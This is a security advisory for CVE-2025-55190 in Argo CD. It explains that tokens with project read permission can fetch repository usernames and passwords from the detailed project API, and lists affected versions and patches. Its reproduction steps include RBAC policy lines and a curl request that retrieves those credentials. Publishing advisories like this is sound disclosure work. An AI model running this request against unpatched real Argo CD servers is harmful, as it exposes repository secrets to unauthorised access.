# Argo CD's Project API Token Exposes Repository Credentials

**GHSA**: GHSA-786q-9hcg-v9ff | **CVE**: CVE-2025-55190 | **Severity**: critical (CVSS 10.0)

**CWE**: CWE-200

**Affected Packages**:
- **github.com/argoproj/argo-cd/v2** (go): >= 2.13.0, < 2.13.9
- **github.com/argoproj/argo-cd/v2** (go): >= 2.14.0, < 2.14.16
- **github.com/argoproj/argo-cd/v3** (go): < 3.0.14
- **github.com/argoproj/argo-cd/v3** (go): >= 3.1.0-rc1, < 3.1.2

## Description

### Summary
Argo CD API tokens with project-level permissions are able to retrieve sensitive repository credentials (usernames, passwords) through the project details API endpoint, even when the token only has standard application management permissions and no explicit access to secrets.

Component: `Project API (/api/v1/projects/{project}/detailed)`


## Vulnerability Details
### Expected Behavior
API tokens should require explicit permission to access sensitive credential information. Standard project permissions should not grant access to repository secrets.
### Actual Behavior
API tokens with basic project permissions can retrieve all repository credentials associated with a project through the detailed project API endpoint.

**Note**: This vulnerability does not only affect project-level permissions. Any token with project get permissions is also vulnerable, including global permissions such as: `p, role/user, projects, get, *, allow`

### Steps to Reproduce

1. Create an API token with the following project-level permissions:
  ```
  p, proj:myProject:project-automation-role, applications, sync, myProject/*, allow
  p, proj:myProject:project-automation-role, applications, action/argoproj.io/Rollout/*, myProject/*, allow
  p, proj:myProject:project-automation-role, applications, get, myProject/*, allow
  ```

2. Call the project details API:
  ```
  bashcurl -sH "Authorization: Bearer $ARGOCD_API_TOKEN" \
    "https://argocd.example.com/api/v1/projects/myProject/detailed"
  
  ```
3. Observe that the response includes sensitive repository credentials:
  ```
  {
    "repositories": [
      {
        "username": "<REDACTED>",
        "password": "<REDACTED>",
        "type": "helm",
        "name": "test-helm-repo",
        "project": "myProject"
      }
    ]
  }
  ```

## Patches

* v3.1.2
* v3.0.14
* v2.14.16
* v2.13.9


Credits to @ashishgoyal111 for helping identify this issue.
